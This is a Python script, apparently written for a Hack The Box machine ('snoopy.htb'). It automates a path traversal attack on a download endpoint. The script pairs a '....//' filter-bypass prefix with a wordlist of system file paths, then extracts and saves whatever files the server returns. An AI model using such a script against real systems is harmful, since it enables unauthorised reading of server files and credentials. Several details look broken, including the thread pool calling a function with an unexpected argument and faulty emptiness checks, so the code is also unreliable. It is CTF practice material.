import requests
import zipfile
import io
import os
import logging
import concurrent.futures

cwd = os.getcwd()

error_fileName = "errors.txt"
errors_path = cwd + "/" + error_fileName

result_fileName = "result.txt"
result_path = cwd + "/" + result_fileName

#filename = sys.argv[1]
if os.path.isfile(result_path):
    os.remove(result_path)

if os.path.isfile(errors_path):
    os.remove(errors_path)

#wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
wordlist_path = cwd + "/LFI_fileFinder_wordlist.txt"

file =  open(f"{wordlist_path}", mode="r")
file_errors =  open(f"{errors_path}", mode="w")
result_file = open('result.txt', 'a')

words = file.readlines()
#r = requests.Response()

def fileloop():
    
    for word in words:
        print("Checking: " + word)
        r = requests.get("http://snoopy.htb/download?file=....//....//....//....//....//....//....//" + word.strip(), allow_redirects=True)
        if(isContentEmpty(r)):
            continue
        
        print(word.strip())
        print("Added file.")
    
        result_file.write(printfilecontents(r))
    closeFiles()

def closeFiles():
    result_file.close()
    file.close()
    file_errors.close()

def printfilecontents(r):
    if(isContentEmpty(r)):
        return ""

    print(r.headers)

    contentBytes = bytes(r.content)
    if(contentBytes is b''):
        return ""

    z = zipfile.ZipFile(io.BytesIO(contentBytes))
    z.extractall()

    for filename in z.namelist():
        with open(filename, 'r') as f:
            try:
                contents = "-" * 12 + "\n" + filename + "\n"
                contents = contents + f.read()
                contents = contents + "-" * 12 + "\n"
                print(contents)
            except:
                print("Not able to read file: " + filename)
                file_errors.write(filename)
                continue

    for filename in z.namelist():
        os.remove(filename)

    return contents

def isContentEmpty(r):
    if("'Content-Length': '0'" in r.headers or not 'Content-Length' in r.headers):
        return True
    return False


if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        executor.map(fileloop, range(8))


fileloop()